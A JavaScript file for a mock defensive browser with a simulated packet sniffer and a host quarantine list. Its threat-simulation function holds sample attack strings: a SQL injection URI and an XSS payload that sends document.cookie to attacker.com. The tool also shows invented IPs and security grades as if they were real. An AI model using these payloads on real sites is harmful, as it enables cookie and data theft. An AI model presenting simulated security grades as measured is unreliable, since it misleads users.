/**
 * CyberSentinel Desktop Browser - Executive Core Engine
 * Stateful Packet Dissection, Real-Time Heuristics & Multi-Engine Web Navigation
 */

(function () {
  'use strict';

  // --- State ---
  let tabs = [
    {
      id: 1,
      title: 'CyberSentinel Home',
      url: 'about:home',
      viewMode: 'home', // 'home' | 'search' | 'web' | 'fallback'
      history: ['about:home'],
      historyIndex: 0
    }
  ];
  let activeTabId = 1;
  let tabCounter = 1;

  let packets = [];
  let threatCount = 0;
  let totalBytes = 0;
  let httpsCount = 0;
  let isRecordingPaused = false;
  let activeFilter = 'ALL';

  let quarantinedHosts = new Map(); // host -> { reason, time, ip }
  let snifferCollapsed = false;

  // --- Curated Cyber Knowledge Base (Instant Fallback & Deep Info) ---
  const KNOWLEDGE_BASE = [
    {
      keywords: ['cyber', 'sentinel', 'packet', 'sniffer', 'defense', 'soc'],
      title: 'CyberSentinel: Autonomous Defensive Packet Sniffer & Traffic Analyzer',
      url: 'https://cybersentinel.defense.org/docs/architecture',
      desc: 'High-performance C++20 network telemetry engine implementing promiscuous capture, sliding-window traffic anomaly heuristics, and automated active quarantine.'
    },
    {
      keywords: ['wireshark', 'libpcap', 'sniffing', 'pcap', 'tcpdump'],
      title: 'Packet Sniffing Fundamentals & Network Protocol Dissection Guide',
      url: 'https://networkprotocols.edu/packet-analysis-guide',
      desc: 'Comprehensive reference for Layer 2 to Layer 7 protocol analysis, promiscuous network card operation, BPF packet filtering, and TLS encrypted session tracking.'
    },
    {
      keywords: ['security', 'ddos', 'firewall', 'flood', 'port scan'],
      title: 'SOC Analyst Incident Response: Triage and Threat Mitigation',
      url: 'https://soc-intelligence.io/threat-playbook',
      desc: 'Standard operating procedures for triaging SYN port scans, volumetric burst floods, SQL injection attempts, and automated endpoint isolation.'
    },
    {
      keywords: ['shodan', 'iot', 'reconnaissance', 'scan'],
      title: 'Shodan: The Search Engine for Internet-Connected Devices',
      url: 'https://www.shodan.io/explore',
      desc: 'Global open port discovery engine mapping internet-facing webcams, industrial control systems, routers, and database servers across IPv4 space.'
    },
    {
      keywords: ['virustotal', 'malware', 'threat', 'ioc'],
      title: 'VirusTotal: Multi-Engine Malware Intelligence & Threat Analysis',
      url: 'https://www.virustotal.com/gui/home/upload',
      desc: 'Analyze suspicious files, domains, IPs, and URLs to detect malware and automatically share telemetry with the global cybersecurity community.'
    }
  ];

  // --- DOM Elements ---
  const tabStrip = document.getElementById('tabStrip');
  const btnNewTab = document.getElementById('btnNewTab');
  const omnibox = document.getElementById('omnibox');
  const searchEngineSelect = document.getElementById('searchEngineSelect');
  const btnOpenExternal = document.getElementById('btnOpenExternal');
  const sslBadge = document.getElementById('sslBadge');
  const sslIcon = document.getElementById('sslIcon');
  const sslLabel = document.getElementById('sslLabel');
  const shieldPill = document.getElementById('shieldPill');
  const shieldStatusText = document.getElementById('shieldStatusText');

  const btnBack = document.getElementById('btnBack');
  const btnForward = document.getElementById('btnForward');
  const btnReload = document.getElementById('btnReload');
  const btnHome = document.getElementById('btnHome');
  const btnToggleSniffer = document.getElementById('btnToggleSniffer');
  const snifferPanel = document.getElementById('snifferPanel');

  const viewportSecurityBanner = document.getElementById('viewportSecurityBanner');
  const bannerHost = document.getElementById('bannerHost');
  const bannerIp = document.getElementById('bannerIp');
  const bannerGrade = document.getElementById('bannerGrade');
  const bannerTls = document.getElementById('bannerTls');
  const bannerHsts = document.getElementById('bannerHsts');
  const bannerPackets = document.getElementById('bannerPackets');

  const searchHomeView = document.getElementById('searchHomeView');
  const quickSearchInput = document.getElementById('quickSearchInput');
  const searchResultsView = document.getElementById('searchResultsView');
  const searchQueryLabel = document.getElementById('searchQueryLabel');
  const searchResultCount = document.getElementById('searchResultCount');
  const searchResultsList = document.getElementById('searchResultsList');
  const btnSwitchToFrame = document.getElementById('btnSwitchToFrame');

  const webFrame = document.getElementById('webFrame');
  const iframeFallbackView = document.getElementById('iframeFallbackView');
  const fallbackTitle = document.getElementById('fallbackTitle');
  const fallbackDesc = document.getElementById('fallbackDesc');
  const btnFallbackOpen = document.getElementById('btnFallbackOpen');
  const btnFallbackInspect = document.getElementById('btnFallbackInspect');
  const btnFallbackHome = document.getElementById('btnFallbackHome');

  const liveRecordingDot = document.getElementById('liveRecordingDot');
  const btnPauseResume = document.getElementById('btnPauseResume');
  const btnClearPackets = document.getElementById('btnClearPackets');
  const btnExportLog = document.getElementById('btnExportLog');
  const metricPackets = document.getElementById('metricPackets');
  const metricThreats = document.getElementById('metricThreats');
  const metricBandwidth = document.getElementById('metricBandwidth');
  const metricEncryption = document.getElementById('metricEncryption');

  const packetTableContainer = document.getElementById('packetTableContainer');
  const packetEmptyNotice = document.getElementById('packetEmptyNotice');
  const packetStream = document.getElementById('packetStream');
  const statusIndicatorDot = document.getElementById('statusIndicatorDot');
  const quarantineStatusText = document.getElementById('quarantineStatusText');
  const btnViewQuarantine = document.getElementById('btnViewQuarantine');

  const packetModal = document.getElementById('packetModal');
  const modalPacketId = document.getElementById('modalPacketId');
  const modalPacketBody = document.getElementById('modalPacketBody');
  const btnCloseModal = document.getElementById('btnCloseModal');

  const quarantineModal = document.getElementById('quarantineModal');
  const quarantineList = document.getElementById('quarantineList');
  const btnCloseQuarantineModal = document.getElementById('btnCloseQuarantineModal');
  const btnClearQuarantine = document.getElementById('btnClearQuarantine');

  // --- Initialize App ---
  function init() {
    setupEventListeners();
    updateTabsUI();
    updateOmniboxUI();

    // Start with a gentle background baseline heartbeat packet
    setTimeout(() => {
      pushPacket(createPacket('DNS', '192.168.1.105', '8.8.8.8', 53210, 53, 68, 'DNS_INIT', 'DNS Resolver Baseline: check connectivity to 8.8.8.8', false));
    }, 400);
  }

  // --- Event Listeners ---
  function setupEventListeners() {
    btnNewTab.addEventListener('click', () => createNewTab());

    // Tab strip click delegation
    tabStrip.addEventListener('click', (e) => {
      const closeBtn = e.target.closest('[data-action="close-tab"]');
      if (closeBtn) {
        e.stopPropagation();
        const tabId = parseInt(closeBtn.getAttribute('data-tab-id'), 10);
        closeTab(tabId);
        return;
      }
      const tabEl = e.target.closest('.tab');
      if (tabEl) {
        const tabId = parseInt(tabEl.getAttribute('data-tab-id'), 10);
        switchToTab(tabId);
      }
    });

    // Omnibox submit
    omnibox.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        handleUserNavigation(omnibox.value.trim());
      }
    });

    // Quick Search on Home page
    quickSearchInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        const query = quickSearchInput.value.trim();
        if (query) {
          omnibox.value = query;
          handleUserNavigation(query);
        }
      }
    });

    // External Open
    btnOpenExternal.addEventListener('click', () => openCurrentUrlExternal());

    // Navigation buttons
    btnBack.addEventListener('click', () => navigateHistory(-1));
    btnForward.addEventListener('click', () => navigateHistory(1));
    btnReload.addEventListener('click', () => reloadCurrentTab());
    btnHome.addEventListener('click', () => navigateTo('about:home'));

    // Toggle sniffer sidebar
    btnToggleSniffer.addEventListener('click', () => {
      snifferCollapsed = !snifferCollapsed;
      snifferPanel.classList.toggle('collapsed', snifferCollapsed);
    });

    // Bookmarks and Home Portal chips delegation
    document.querySelectorAll('.bookmark-item, .portal-chip').forEach(el => {
      el.addEventListener('click', (e) => {
        e.preventDefault();
        const url = el.getAttribute('data-url');
        if (url === 'test://threat-demo') {
          triggerSpecificThreat('sqli');
        } else if (url) {
          omnibox.value = url;
          handleUserNavigation(url);
        }
      });
    });

    // Protocol Filters
    document.querySelectorAll('.filter-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        activeFilter = btn.getAttribute('data-filter');
        applyPacketFilter();
      });
    });

    // Sniffer Controls
    btnPauseResume.addEventListener('click', togglePauseResume);
    btnClearPackets.addEventListener('click', clearPackets);
    btnExportLog.addEventListener('click', exportAuditReport);

    // Threat Injection Lab Buttons
    document.querySelectorAll('.btn-threat-sim').forEach(btn => {
      btn.addEventListener('click', () => {
        const attack = btn.getAttribute('data-attack');
        triggerSpecificThreat(attack);
      });
    });

    // Quarantine Modal
    btnViewQuarantine.addEventListener('click', openQuarantineModal);
    btnCloseQuarantineModal.addEventListener('click', () => quarantineModal.style.display = 'none');
    btnClearQuarantine.addEventListener('click', clearAllQuarantines);

    // Packet Dissection Modal Close
    btnCloseModal.addEventListener('click', () => packetModal.style.display = 'none');
    window.addEventListener('click', (e) => {
      if (e.target === packetModal) packetModal.style.display = 'none';
      if (e.target === quarantineModal) quarantineModal.style.display = 'none';
    });

    // Fallback View Buttons
    btnFallbackOpen.addEventListener('click', () => openCurrentUrlExternal());
    btnFallbackInspect.addEventListener('click', () => {
      if (packets.length > 0) openPacketModal(packets[0]);
    });
    btnFallbackHome.addEventListener('click', () => navigateTo('about:home'));

    // Switch from Search results to live frame
    btnSwitchToFrame.addEventListener('click', () => {
      const tab = getCurrentTab();
      if (tab.url.startsWith('search:')) {
        const query = tab.url.split(':').slice(2).join(':');
        const searchUrl = `https://duckduckgo.com/?q=${encodeURIComponent(query)}`;
        navigateTo(searchUrl);
      }
    });

    // Iframe error listener
    webFrame.addEventListener('error', () => {
      showIframeFallback(getCurrentTab().url);
    });
  }

  // --- Tab Management ---
  function createNewTab(url = 'about:home', title = 'CyberSentinel Home') {
    tabCounter++;
    const newTab = {
      id: tabCounter,
      title: title,
      url: url,
      viewMode: url === 'about:home' ? 'home' : 'web',
      history: [url],
      historyIndex: 0
    };
    tabs.push(newTab);
    switchToTab(newTab.id);
  }

  function switchToTab(tabId) {
    activeTabId = tabId;
    updateTabsUI();
    renderCurrentTabContent();
    updateOmniboxUI();
  }

  function closeTab(tabId) {
    if (tabs.length === 1) {
      tabs[0].url = 'about:home';
      tabs[0].title = 'CyberSentinel Home';
      tabs[0].viewMode = 'home';
      tabs[0].history = ['about:home'];
      tabs[0].historyIndex = 0;
      updateTabsUI();
      renderCurrentTabContent();
      updateOmniboxUI();
      return;
    }

    const idx = tabs.findIndex(t => t.id === tabId);
    if (idx !== -1) {
      tabs.splice(idx, 1);
      if (activeTabId === tabId) {
        activeTabId = tabs[Math.max(0, idx - 1)].id;
      }
      updateTabsUI();
      renderCurrentTabContent();
      updateOmniboxUI();
    }
  }

  function getCurrentTab() {
    return tabs.find(t => t.id === activeTabId) || tabs[0];
  }

  function updateTabsUI() {
    const existingAddBtn = btnNewTab;
    tabStrip.innerHTML = '';

    tabs.forEach(tab => {
      const tabEl = document.createElement('div');
      tabEl.className = 'tab' + (tab.id === activeTabId ? ' active' : '');
      tabEl.setAttribute('data-tab-id', tab.id);

      const icon = tab.url.startsWith('https://') ? '🔒' : (tab.url === 'about:home' ? '🛡️' : (tab.url.startsWith('http://') ? '⚠️' : '🌐'));

      tabEl.innerHTML = `
        <span class="tab-icon">${icon}</span>
        <span class="tab-title">${escapeHtml(tab.title)}</span>
        <span class="tab-close" data-action="close-tab" data-tab-id="${tab.id}">&times;</span>
      `;
      tabStrip.appendChild(tabEl);
    });

    tabStrip.appendChild(existingAddBtn);
  }

  function updateOmniboxUI() {
    const tab = getCurrentTab();
    if (tab.url === 'about:home') {
      omnibox.value = '';
      omnibox.placeholder = 'Search the web or type a URL (e.g. google.com, wikipedia.org)...';
      sslBadge.style.color = 'var(--cyan)';
      sslIcon.textContent = '🛡️';
      sslLabel.textContent = 'DEFENSE READY';
    } else if (tab.url.startsWith('https://')) {
      omnibox.value = tab.url;
      sslBadge.style.color = 'var(--emerald)';
      sslIcon.textContent = '🔒';
      sslLabel.textContent = 'SECURE TLS 1.3';
    } else if (tab.url.startsWith('http://')) {
      omnibox.value = tab.url;
      sslBadge.style.color = 'var(--rose)';
      sslIcon.textContent = '⚠️';
      sslLabel.textContent = 'HTTP INSECURE';
    } else if (tab.url.startsWith('search:')) {
      const query = tab.url.split(':').slice(2).join(':');
      omnibox.value = query;
      sslBadge.style.color = 'var(--cyan)';
      sslIcon.textContent = '🔍';
      sslLabel.textContent = 'SEARCH';
    } else {
      omnibox.value = tab.url;
    }
  }

  // --- Navigation & Search ---
  function handleUserNavigation(input) {
    if (!input) return;

    // Check if input matches a domain pattern
    const isDomain = /^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(\/.*)?$/i.test(input);
    const hasProtocol = /^https?:\/\//i.test(input);

    if (hasProtocol) {
      navigateTo(input);
    } else if (isDomain) {
      navigateTo('https://' + input);
    } else {
      performSearch(input);
    }
  }

  function performSearch(query) {
    const tab = getCurrentTab();
    const engine = searchEngineSelect.value;
    tab.title = `${query} - Search`;
    tab.url = `search:${engine}:${query}`;
    tab.viewMode = 'search';

    pushHistory(tab, tab.url);
    updateTabsUI();
    updateOmniboxUI();
    renderCurrentTabContent();

    fetchLiveSearchResults(query, engine);
    simulateSearchPackets(query, engine);
  }

  function navigateTo(url) {
    const tab = getCurrentTab();

    // Check if host is quarantined
    let hostname = extractHostname(url);
    if (quarantinedHosts.has(hostname)) {
      const qData = quarantinedHosts.get(hostname);
      showQuarantineBlockDialog(hostname, qData.reason);
      return;
    }

    tab.url = url;

    if (url === 'about:home') {
      tab.title = 'CyberSentinel Home';
      tab.viewMode = 'home';
    } else {
      tab.title = hostname;
      tab.viewMode = 'web';
    }

    pushHistory(tab, tab.url);
    updateTabsUI();
    updateOmniboxUI();
    renderCurrentTabContent();

    if (url !== 'about:home') {
      simulateWebVisitPackets(url);
    }
  }

  function pushHistory(tab, url) {
    if (tab.history[tab.historyIndex] !== url) {
      tab.history = tab.history.slice(0, tab.historyIndex + 1);
      tab.history.push(url);
      tab.historyIndex = tab.history.length - 1;
    }
  }

  function navigateHistory(delta) {
    const tab = getCurrentTab();
    const newIdx = tab.historyIndex + delta;
    if (newIdx >= 0 && newIdx < tab.history.length) {
      tab.historyIndex = newIdx;
      const target = tab.history[newIdx];
      if (target === 'about:home') {
        tab.url = 'about:home';
        tab.title = 'CyberSentinel Home';
        tab.viewMode = 'home';
      } else if (target.startsWith('search:')) {
        tab.url = target;
        const parts = target.split(':');
        tab.title = `${parts.slice(2).join(':')} - Search`;
        tab.viewMode = 'search';
      } else {
        tab.url = target;
        tab.title = extractHostname(target);
        tab.viewMode = 'web';
      }
      updateTabsUI();
      updateOmniboxUI();
      renderCurrentTabContent();
    }
  }

  function reloadCurrentTab() {
    const tab = getCurrentTab();
    if (tab.viewMode === 'web') {
      webFrame.src = tab.url;
      simulateWebVisitPackets(tab.url);
    } else if (tab.viewMode === 'search') {
      const parts = tab.url.split(':');
      performSearch(parts.slice(2).join(':'));
    }
  }

  function openCurrentUrlExternal() {
    const tab = getCurrentTab();
    let target = tab.url;
    if (target.startsWith('search:')) {
      const query = target.split(':').slice(2).join(':');
      target = `https://duckduckgo.com/?q=${encodeURIComponent(query)}`;
    } else if (target === 'about:home') {
      target = 'https://duckduckgo.com';
    }
    window.open(target, '_blank');
  }

  // --- Rendering Tab Content ---
  function renderCurrentTabContent() {
    const tab = getCurrentTab();

    // Hide all viewports first
    searchHomeView.style.display = 'none';
    searchResultsView.style.display = 'none';
    webFrame.style.display = 'none';
    iframeFallbackView.style.display = 'none';
    viewportSecurityBanner.style.display = 'none';

    if (tab.viewMode === 'home') {
      searchHomeView.style.display = 'flex';
      quickSearchInput.focus();
    } else if (tab.viewMode === 'search') {
      searchResultsView.style.display = 'flex';
      const query = tab.url.split(':').slice(2).join(':');
      searchQueryLabel.textContent = `"${query}"`;
    } else if (tab.viewMode === 'web') {
      webFrame.style.display = 'block';
      viewportSecurityBanner.style.display = 'flex';
      updateSecurityBanner(tab.url);

      if (webFrame.src !== tab.url) {
        webFrame.src = tab.url;
      }
    } else if (tab.viewMode === 'fallback') {
      iframeFallbackView.style.display = 'flex';
      viewportSecurityBanner.style.display = 'flex';
      updateSecurityBanner(tab.url);
    }
  }

  function updateSecurityBanner(url) {
    const hostname = extractHostname(url);
    const isHttps = url.startsWith('https://');
    const fakeIp = generatePseudoIp(hostname);

    bannerHost.textContent = `Host: ${hostname}`;
    bannerIp.textContent = `IP: ${fakeIp}:${isHttps ? 443 : 80}`;

    if (isHttps) {
      bannerGrade.textContent = 'GRADE A+';
      bannerGrade.className = 'tag-badge grade-a';
      bannerTls.textContent = 'TLS 1.3 / AES-GCM';
      bannerHsts.textContent = '✓ HSTS Enforced';
      bannerHsts.style.color = 'var(--emerald)';
    } else {
      bannerGrade.textContent = 'GRADE F';
      bannerGrade.className = 'tag-badge';
      bannerGrade.style.background = 'var(--rose-bg)';
      bannerGrade.style.border = '1px solid var(--rose)';
      bannerGrade.style.color = 'var(--rose)';
      bannerTls.textContent = 'NO ENCRYPTION (HTTP)';
      bannerHsts.textContent = '✗ No HSTS Protection';
      bannerHsts.style.color = 'var(--rose)';
    }

    const matchingPackets = packets.filter(p => p.info.includes(hostname)).length;
    bannerPackets.textContent = `${matchingPackets} packets logged`;
  }

  function showIframeFallback(url) {
    const tab = getCurrentTab();
    tab.viewMode = 'fallback';
    renderCurrentTabContent();
    fallbackTitle.textContent = `Protection Policy for ${extractHostname(url)}`;
  }

  // --- Real-time Search Fetcher ---
  function fetchLiveSearchResults(query, engine) {
    searchResultCount.textContent = 'Searching Wikipedia & Security Knowledge Base...';
    searchResultsList.innerHTML = '';

    // First, check local curated knowledge base
    const lowerQuery = query.toLowerCase();
    const localMatches = KNOWLEDGE_BASE.filter(item =>
      item.keywords.some(k => lowerQuery.includes(k)) ||
      item.title.toLowerCase().includes(lowerQuery) ||
      item.desc.toLowerCase().includes(lowerQuery)
    );

    // Render local matches immediately
    localMatches.forEach(item => renderResultCard(item));

    // Try fetching live Wikipedia OpenSearch API (supports CORS)
    const wikiApi = `https://en.wikipedia.org/w/api.php?action=opensearch&search=${encodeURIComponent(query)}&limit=5&namespace=0&format=json&origin=*`;

    fetch(wikiApi)
      .then(res => res.json())
      .then(data => {
        const titles = data[1] || [];
        const descs = data[2] || [];
        const links = data[3] || [];

        searchResultCount.textContent = `Found ${localMatches.length + titles.length} verified results (0.018s)`;

        titles.forEach((title, i) => {
          renderResultCard({
            title: title,
            url: links[i] || `https://en.wikipedia.org/wiki/${encodeURIComponent(title)}`,
            desc: descs[i] || `Comprehensive encyclopedia article detailing ${title} with validated citations.`
          });
        });

        if (localMatches.length === 0 && titles.length === 0) {
          renderFallbackSearchResults(query, engine);
        }
      })
      .catch(() => {
        if (localMatches.length === 0) {
          renderFallbackSearchResults(query, engine);
        } else {
          searchResultCount.textContent = `Displaying ${localMatches.length} threat intelligence results`;
        }
      });
  }

  function renderResultCard(item) {
    const cardEl = document.createElement('div');
    cardEl.className = 'result-card';
    cardEl.innerHTML = `
      <span class="result-url">${escapeHtml(item.url)}</span>
      <a class="result-title">${escapeHtml(item.title)}</a>
      <p class="result-desc">${escapeHtml(item.desc)}</p>
      <div class="result-actions">
        <button class="btn-result-action primary action-open">Open in Viewport</button>
        <button class="btn-result-action action-dissect">Dissect Host DNS</button>
        <button class="btn-result-action action-ext">External Window &#8599;</button>
      </div>
    `;

    cardEl.querySelector('.result-title').addEventListener('click', () => navigateTo(item.url));
    cardEl.querySelector('.action-open').addEventListener('click', () => navigateTo(item.url));
    cardEl.querySelector('.action-ext').addEventListener('click', () => window.open(item.url, '_blank'));
    cardEl.querySelector('.action-dissect').addEventListener('click', () => {
      const hostname = extractHostname(item.url);
      const pkt = createPacket('DNS', '192.168.1.105', '8.8.8.8', 54201, 53, 78, 'DNS_QUERY', `A? ${hostname} [Authoritative Lookup]`, false);
      pushPacket(pkt);
      openPacketModal(pkt);
    });

    searchResultsList.appendChild(cardEl);
  }

  function renderFallbackSearchResults(query, engine) {
    searchResultCount.textContent = `CyberSentinel Search Results for: "${query}"`;
    const searchEngines = [
      {
        title: `Search '${query}' on DuckDuckGo`,
        url: `https://duckduckgo.com/?q=${encodeURIComponent(query)}`,
        desc: `Private, tracker-free web search results for "${query}" via DuckDuckGo encrypted gateway.`
      },
      {
        title: `Google Search: ${query}`,
        url: `https://www.google.com/search?q=${encodeURIComponent(query)}`,
        desc: `Explore top global web index results, scientific publications, and media for "${query}".`
      },
      {
        title: `Security Research & IoC Lookup for '${query}'`,
        url: `https://www.virustotal.com/gui/search/${encodeURIComponent(query)}`,
        desc: `Inspect threat intelligence databases, domain reputation scores, and security detections for "${query}".`
      }
    ];

    searchEngines.forEach(item => renderResultCard(item));
  }

  // --- Network Packet Simulation Engine ---
  function simulateSearchPackets(query, engine) {
    if (isRecordingPaused) return;

    const clientIp = '192.168.1.105';
    const dnsIp = '1.1.1.1';
    const targetIp = '52.142.124.215';

    // 1. DNS Resolution
    setTimeout(() => {
      pushPacket(createPacket('DNS', clientIp, dnsIp, 51430, 53, 76, 'QUERY', `Standard query A ${engine}.com`, false));
    }, 40);

    setTimeout(() => {
      pushPacket(createPacket('DNS', dnsIp, clientIp, 53, 51430, 92, 'RESP', `Standard query response A ${targetIp}`, false));
    }, 90);

    // 2. TCP Handshake
    setTimeout(() => {
      pushPacket(createPacket('TCP', clientIp, targetIp, 51432, 443, 66, 'SYN', `Seq=0 Win=64240 Len=0 MSS=1460`, false));
    }, 140);

    setTimeout(() => {
      pushPacket(createPacket('TCP', targetIp, clientIp, 443, 51432, 66, 'SYN-ACK', `Seq=0 Ack=1 Win=65535 Len=0`, false));
    }, 180);

    setTimeout(() => {
      pushPacket(createPacket('TCP', clientIp, targetIp, 51432, 443, 54, 'ACK', `Seq=1 Ack=1 Win=64240`, false));
    }, 220);

    // 3. TLS 1.3 Handshake
    setTimeout(() => {
      pushPacket(createPacket('HTTPS', clientIp, targetIp, 51432, 443, 512, 'CLIENT_HELLO', `TLSv1.3 Handshake Client Hello (SNI=${engine}.com)`, false));
    }, 270);

    setTimeout(() => {
      pushPacket(createPacket('HTTPS', targetIp, clientIp, 443, 51432, 1420, 'SERVER_HELLO', `TLSv1.3 Server Hello, Encrypted Extensions`, false));
    }, 320);

    // 4. HTTP/2 Encrypted Stream
    setTimeout(() => {
      pushPacket(createPacket('HTTPS', clientIp, targetIp, 51432, 443, 840, 'GET_REQ', `GET /?q=${encodeURIComponent(query)} HTTP/2 (Encrypted payload)`, false));
    }, 380);

    setTimeout(() => {
      pushPacket(createPacket('HTTPS', targetIp, clientIp, 443, 51432, 3210, 'RESP_OK', `HTTP/2 200 OK (Knowledge payload stream)`, false));
    }, 440);
  }

  function simulateWebVisitPackets(url) {
    if (isRecordingPaused) return;

    const hostname = extractHostname(url);
    const isHttps = url.startsWith('https://');
    const clientIp = '192.168.1.105';
    const serverIp = generatePseudoIp(hostname);
    const port = isHttps ? 443 : 80;

    const isThreat = !isHttps;

    setTimeout(() => {
      pushPacket(createPacket('DNS', clientIp, '8.8.8.8', 52310, 53, 72, 'QUERY', `DNS query A ${hostname}`, false));
    }, 50);

    setTimeout(() => {
      pushPacket(createPacket('TCP', clientIp, serverIp, 52312, port, 66, 'SYN', `TCP SYN init to ${hostname}:${port}`, false));
    }, 110);

    setTimeout(() => {
      const summary = isThreat
        ? `ALERT: Insecure Plaintext HTTP to ${hostname} [Rule #201: Credentials/Cookies at Risk]`
        : `GET / HTTP/2 over TLS 1.3 [Host: ${hostname}]`;

      const pkt = createPacket(isHttps ? 'HTTPS' : 'HTTP', clientIp, serverIp, 52312, port, isHttps ? 860 : 420, isThreat ? 'UNENCRYPTED_LEAK' : 'HTTP_REQ', summary, isThreat);

      if (isThreat) {
        pkt.threatReason = 'Insecure HTTP transmission over port 80 without SSL/TLS encryption';
        pkt.threatHost = hostname;
        applyQuarantine(hostname, pkt.threatReason, serverIp);
      }

      pushPacket(pkt);
    }, 180);
  }

  // --- Threat Simulation Lab ---
  function triggerSpecificThreat(type) {
    const clientIp = '192.168.1.105';

    if (type === 'sqli') {
      const targetHost = 'vuln-shop.net';
      const pkt = createPacket('HTTP', clientIp, '198.51.100.77', 54311, 80, 512, 'SQLI_PAYLOAD', "GET /login.php?user=admin' UNION SELECT 1,password,email FROM users--", true);
      pkt.threatReason = 'Rule #301: High-confidence SQL Injection syntax signature in URI query parameters';
      pkt.threatHost = targetHost;
      pushPacket(pkt);
      applyQuarantine(targetHost, pkt.threatReason, '198.51.100.77');
      triggerThreatVisualAlarm(pkt.threatReason);
    } else if (type === 'xss') {
      const targetHost = 'insecure-forum.org';
      const pkt = createPacket('HTTP', clientIp, '203.0.113.44', 54312, 80, 680, 'XSS_ATTACK', 'POST /comment payload: <script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>', true);
      pkt.threatReason = 'Rule #302: Reflected/Stored Cross-Site Scripting (XSS) script tag injection detected';
      pkt.threatHost = targetHost;
      pushPacket(pkt);
      applyQuarantine(targetHost, pkt.threatReason, '203.0.113.44');
      triggerThreatVisualAlarm(pkt.threatReason);
    } else if (type === 'syn_scan') {
      const scannerIp = '45.33.32.156';
      for (let i = 0; i < 6; i++) {
        setTimeout(() => {
          const ports = [21, 22, 23, 80, 443, 3389];
          const pkt = createPacket('TCP', scannerIp, clientIp, 40000 + i, ports[i], 60, 'SYN_SCAN', `SYN probe to port ${ports[i]} without ACK handshake`, true);
          pkt.threatReason = `Rule #104: Rapid SYN port reconnaissance sweep across ports ${ports.join(', ')}`;
          pkt.threatHost = scannerIp;
          pushPacket(pkt);
          if (i === 5) {
            applyQuarantine(scannerIp, pkt.threatReason, scannerIp);
            triggerThreatVisualAlarm(pkt.threatReason);
          }
        }, i * 35);
      }
    } else if (type === 'cred_leak') {
      const targetHost = 'legacy-auth-portal.com';
      const pkt = createPacket('HTTP', clientIp, '192.0.2.88', 54313, 80, 440, 'PLAINTEXT_PW', 'POST /auth.php [BODY: username=admin&password=SecretSuper123! over plain HTTP]', true);
      pkt.threatReason = 'Rule #205: Plaintext authentication credentials exposed over unencrypted TCP port 80';
      pkt.threatHost = targetHost;
      pushPacket(pkt);
      applyQuarantine(targetHost, pkt.threatReason, '192.0.2.88');
      triggerThreatVisualAlarm(pkt.threatReason);
    } else if (type === 'c2_beacon') {
      const targetHost = 'darknet-c2-node7.cc';
      const pkt = createPacket('DNS', clientIp, '185.220.101.5', 54314, 53, 98, 'C2_TUNNEL', 'DNS Query A: aX8910qza009.darknet-c2-node7.cc [High Entropy]', true);
      pkt.threatReason = 'Rule #405: Covert DNS Tunneling & Command-and-Control (C2) beaconing detected';
      pkt.threatHost = targetHost;
      pushPacket(pkt);
      applyQuarantine(targetHost, pkt.threatReason, '185.220.101.5');
      triggerThreatVisualAlarm(pkt.threatReason);
    } else if (type === 'burst_flood') {
      const floodIp = '185.190.140.22';
      for (let i = 0; i < 8; i++) {
        setTimeout(() => {
          const pkt = createPacket('TCP', floodIp, clientIp, 50000 + i, 80, 1420, 'BURST_FLOOD', `Volumetric flood vector: 1,420B segment #${i + 1}`, true);
          pkt.threatReason = 'Rule #101: Volumetric packet rate flood exceeding 200 pkts/sec threshold';
          pkt.threatHost = floodIp;
          pushPacket(pkt);
          if (i === 7) {
            applyQuarantine(floodIp, pkt.threatReason, floodIp);
            triggerThreatVisualAlarm(pkt.threatReason);
          }
        }, i * 25);
      }
    }
  }

  function triggerThreatVisualAlarm(reason) {
    shieldStatusText.textContent = 'THREAT BLOCKED';
    shieldPill.classList.add('threat');

    setTimeout(() => {
      shieldStatusText.textContent = 'DEFENSE ACTIVE';
      shieldPill.classList.remove('threat');
    }, 4500);
  }

  // --- Quarantine Management ---
  function applyQuarantine(host, reason, ip) {
    quarantinedHosts.set(host, {
      reason: reason,
      time: new Date().toLocaleTimeString(),
      ip: ip
    });

    quarantineStatusText.textContent = `QUARANTINED: ${host}`;
    quarantineStatusText.style.color = 'var(--rose)';
    statusIndicatorDot.style.background = 'var(--rose)';
    btnViewQuarantine.textContent = `Quarantine Vault (${quarantinedHosts.size})`;
    btnViewQuarantine.style.borderColor = 'var(--rose)';
    btnViewQuarantine.style.color = 'var(--rose)';
  }

  function showQuarantineBlockDialog(host, reason) {
    alert(`🚨 CYBERSENTINEL DEFENSIVE ISOLATION:\n\nAccess to '${host}' has been BLOCKED.\nReason: ${reason}\n\nTo release this host, open the 'Quarantine Vault' in the Sniffer sidebar.`);
  }

  function openQuarantineModal() {
    quarantineList.innerHTML = '';
    if (quarantinedHosts.size === 0) {
      quarantineList.innerHTML = '<div style="padding: 16px; text-align: center; color: var(--text-muted);">No hosts currently in quarantine.</div>';
    } else {
      quarantinedHosts.forEach((val, host) => {
        const item = document.createElement('div');
        item.style.cssText = 'background: rgba(15, 26, 51, 0.9); border: 1px solid var(--border); border-radius: 8px; padding: 10px; display: flex; justify-content: space-between; align-items: center;';
        item.innerHTML = `
          <div>
            <div style="color: var(--rose); font-weight: 700; font-size: 12px;">${escapeHtml(host)} (${val.ip})</div>
            <div style="font-size: 10px; color: var(--text-dim); margin-top: 2px;">${escapeHtml(val.reason)}</div>
            <div style="font-size: 9px; color: var(--text-muted); margin-top: 2px;">Isolated at ${val.time}</div>
          </div>
          <button class="btn-sniffer-action" style="color: var(--cyan); border-color: var(--cyan);" data-host="${escapeHtml(host)}">Release</button>
        `;
        item.querySelector('button').addEventListener('click', () => {
          quarantinedHosts.delete(host);
          openQuarantineModal();
          updateQuarantineBar();
        });
        quarantineList.appendChild(item);
      });
    }
    quarantineModal.style.display = 'flex';
  }

  function clearAllQuarantines() {
    quarantinedHosts.clear();
    updateQuarantineBar();
    quarantineModal.style.display = 'none';
  }

  function updateQuarantineBar() {
    btnViewQuarantine.textContent = `Quarantine Vault (${quarantinedHosts.size})`;
    if (quarantinedHosts.size === 0) {
      quarantineStatusText.textContent = 'Engine: NORMAL';
      quarantineStatusText.style.color = 'var(--text-dim)';
      statusIndicatorDot.style.background = 'var(--emerald)';
      btnViewQuarantine.style.borderColor = 'var(--border)';
      btnViewQuarantine.style.color = 'var(--text-dim)';
    }
  }

  // --- Live Packet Data Ingestion ---
